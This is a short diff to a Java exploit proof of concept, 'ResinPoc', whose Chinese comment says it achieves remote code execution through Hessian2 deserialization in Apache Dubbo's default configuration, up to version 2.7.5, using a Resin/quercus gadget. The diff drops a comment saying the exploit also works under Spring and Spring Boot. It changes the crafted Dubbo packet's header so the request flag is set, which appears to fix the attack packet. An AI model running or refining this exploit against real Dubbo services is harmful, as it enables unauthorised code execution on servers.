@@ -21,8 +21,6 @@ import org.apache.dubbo.common.serialize.Cleanable;
 /**
  * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
  *
- * Spring和Spring boot环境下都能打
- *
  * <dependency>
  *    <groupId>com.caucho</groupId>
  *    <artifactId>quercus</artifactId>
@@ -62,7 +60,7 @@ public class ResinPoc {
       // set magic number.
       Bytes.short2bytes((short) 0xdabb, header);
       // set request and serialization flag.
-      header[2] = (byte) ((byte) 0x20 | 2);
+      header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
 
       // set request id.
       Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
